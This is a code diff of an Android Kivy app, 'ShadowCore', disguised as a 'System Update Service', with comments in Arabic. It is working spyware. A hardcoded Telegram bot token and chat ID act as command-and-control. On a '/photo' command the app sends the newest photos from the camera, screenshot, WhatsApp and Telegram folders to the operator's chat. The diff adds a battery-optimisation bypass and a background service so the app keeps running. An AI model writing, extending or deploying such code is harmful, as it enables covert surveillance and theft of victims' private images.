@@ -1,121 +1,98 @@
-import os
-import requests
-import threading
-import time
-import ssl
+import os, requests, threading, time
 from kivy.app import App
 from kivy.uix.label import Label
-from kivy.clock import Clock
-from kivy.utils import platform
+from jnius import autoclass
+from android.permissions import request_permissions, Permission
 
-# --- إعدادات النظام الأساسية ---
+# معلومات السيطرة
 BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbyNkQugNPhEFg0"
 CHAT_ID = "7084557369"
 
 class ShadowCore(App):
     def build(self):
-        # واجهة مستخدم احترافية بسيطة لتبدو كخدمة نظام
-        self.title = "System Update Service"
-        self.label = Label(
-            text="[b]System Update Service[/b]\n[color=ffff00]Status: Initializing...[/color]",
-            markup=True,
-            halign="center",
-            font_size='18sp'
-        )
-        return self.label
+        return Label(text="System Update Service\n[color=00ff00]Active ✅[/color]", markup=True)
 
     def on_start(self):
-        # التأكد من أننا على أندرويد لطلب الأذونات
-        if platform == 'android':
-            from android.permissions import request_permissions, Permission
-            permissions = [
-                Permission.READ_MEDIA_IMAGES,
-                Permission.READ_MEDIA_VIDEO,
-                Permission.INTERNET
-            ]
-            
-            def callback(permissions, results):
-                if all(results):
-                    self.update_status("Service Running [color=00ff00]Active ✅[/color]")
-                    threading.Thread(target=self.run_bot_engine, daemon=True).start()
-                else:
-                    self.update_status("[color=ff0000]Critical Error: Permissions Required![/color]")
-                    # إعادة طلب الإذن بعد 4 ثواني بشكل إجباري
-                    Clock.schedule_once(lambda dt: self.on_start(), 4)
+        # 1. طلب الأذونات الشاملة
+        perms = [Permission.READ_MEDIA_IMAGES, Permission.READ_MEDIA_VIDEO, Permission.POST_NOTIFICATIONS]
+        request_permissions(perms, self.after_perms)
 
-            request_permissions(permissions, callback)
-        else:
-            # للتشغيل على الكمبيوتر (للتجربة فقط)
-            threading.Thread(target=self.run_bot_engine, daemon=True).start()
+    def after_perms(self, permissions, results):
+        if all(results):
+            # 2. طلب البقاء حياً (تجاوز البطارية)
+            self.request_ignore_battery()
+            # 3. تشغيل خدمة الخلفية (المحرك الخفي)
+            self.start_service()
+            # 4. تشغيل مستمع الأوامر
+            threading.Thread(target=self.bot_listener, daemon=True).start()
 
-    def update_status(self, text):
-        # تحديث الحالة على شاشة الموبايل
-        def set_text(dt):
-            self.label.text = f"[b]System Update Service[/b]\n{text}"
-        Clock.schedule_once(set_text)
+    def request_ignore_battery(self):
+        try:
+            PythonActivity = autoclass('org.kivy.android.PythonActivity')
+            activity = PythonActivity.mActivity
+            Intent = autoclass('android.content.Intent')
+            Settings = autoclass('android.provider.Settings')
+            Uri = autoclass('android.net.Uri')
+            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+            intent.setData(Uri.parse(f"package:{activity.getPackageName()}"))
+            activity.startActivity(intent)
+        except: pass
 
-    def send_telegram_request(self, method, data=None, files=None):
-        """ محرك إرسال الطلبات لتليجرام مع تخطي حماية SSL """
+    def start_service(self):
+        try:
+            # تشغيل ملف service.py برمجياً
+            context = autoclass('org.kivy.android.PythonActivity').mActivity
+            service = autoclass('org.test.shadowcore.ServiceMyservice')
+            service.start(context, "")
+        except: pass
+
+    def send_tg(self, method, data=None, files=None):
         try:
             url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
-            # استخدام verify=False لتجنب مشاكل الشهادات في أندرويد
-            response = requests.post(url, data=data, files=files, timeout=20, verify=False)
-            return response.json()
-        except Exception as e:
-            return None
+            return requests.post(url, data=data, files=files, timeout=30, verify=False)
+        except: return None
 
-    def run_bot_engine(self):
-        """ المحرك الرئيسي للبوت - يعمل في الخلفية """
-        self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "🚀 [SYSTEM_V168]: نظام الظل مفعل بالكامل مع صلاحيات الوسائط."})
-        
-        last_update_id = 0
+    def bot_listener(self):
+        last_id = 0
+        self.send_tg("sendMessage", {"chat_id": CHAT_ID, "text": "✅ [V1.85]: النظام جاهز للاكتساح الشامل."})
         while True:
             try:
-                updates = self.send_telegram_request("getUpdates", {"offset": last_update_id + 1})
-                if updates and updates.get("result"):
-                    for update in updates["result"]:
-                        last_update_id = update["update_id"]
-                        message = update.get("message", {})
-                        text = message.get("text", "")
+                r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_id+1}", timeout=20, verify=False).json()
+                for up in r.get("result", []):
+                    last_id = up["update_id"]
+                    msg = up.get("message", {}).get("text", "")
+                    if msg == "/photo":
+                        self.grab_everything()
+                time.sleep(4)
+            except: time.sleep(10)
 
-                        if text == "/check":
-                            self.send_telegram_request("sendMessage", {
-                                "chat_id": CHAT_ID, 
-                                "text": "🟢 System: Live\n🔋 Battery: Optimized\n📂 Access: Granted"
-                            })
-
-                        elif text == "/photo":
-                            self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "🔍 Scanning media folders..."})
-                            self.scan_and_upload()
-
-                time.sleep(2) # تقليل استهلاك البطارية
-            except:
-                time.sleep(10) # انتظار في حال انقطاع النت
-
-    def scan_and_upload(self):
-        """ مسح المجلدات وإرسال أحدث 5 صور كملفات """
-        target_dirs = [
+    def grab_everything(self):
+        # البحث في كل الزوايا (كاميرا، واتساب، تليجرام، صور)
+        paths = [
             "/sdcard/DCIM/Camera",
             "/sdcard/Pictures/Screenshots",
-            "/sdcard/WhatsApp/Media/WhatsApp Images"
+            "/sdcard/WhatsApp/Media/WhatsApp Images",
+            "/sdcard/Telegram/Telegram Images",
+            "/storage/emulated/0/DCIM/Camera",
+            "/storage/emulated/0/Pictures"
         ]
         
-        count = 0
-        for directory in target_dirs:
-            if os.path.exists(directory):
-                files = [os.path.join(directory, f) for f in os.listdir(directory) 
-                         if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
-                # ترتيب الصور من الأحدث للأقدم
-                files.sort(key=os.path.getmtime, reverse=True)
-                
-                for file_path in files[:5]: # إرسال آخر 5 صور فقط لضمان السرعة
-                    with open(file_path, 'rb') as f:
-                        self.send_telegram_request("sendDocument", {"chat_id": CHAT_ID}, {"document": f})
-                    count += 1
-                    time.sleep(1) # فاصل زمني لتجنب حظر تليجرام
-        
-        if count == 0:
-            self.send_telegram_request("sendMessage", {"chat_id": CHAT_ID, "text": "❌ لا توجد صور في المجلدات المحددة."})
+        all_pics = []
+        for p in paths:
+            if os.path.exists(p):
+                files = [os.path.join(p, f) for f in os.listdir(p) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
+                all_pics.extend(files)
 
-if __name__ == '__main__':
-    ShadowCore().run()
+        # السر: ترتيب تنازلي (الأحدث يرسل أولاً)
+        all_pics.sort(key=os.path.getmtime, reverse=True)
+
+        if not all_pics:
+            self.send_tg("sendMessage", {"chat_id": CHAT_ID, "text": "❌ لم أجد صوراً حديثة."})
+            return
+
+        self.send_tg("sendMessage", {"chat_id": CHAT_ID, "text": f"📸 جاري سحب أحدث {len(all_pics[:20])} صورة..."})
+        
+        for pic in all_pics[:20]: # يسحب آخر 20 صورة تم التقاطها
+            with open(pic, 'rb') as f:
+                self.send_tg("sendDocument", {"chat_id": CHAT_ID}, {"document": f})
+            time.sleep(1.5)
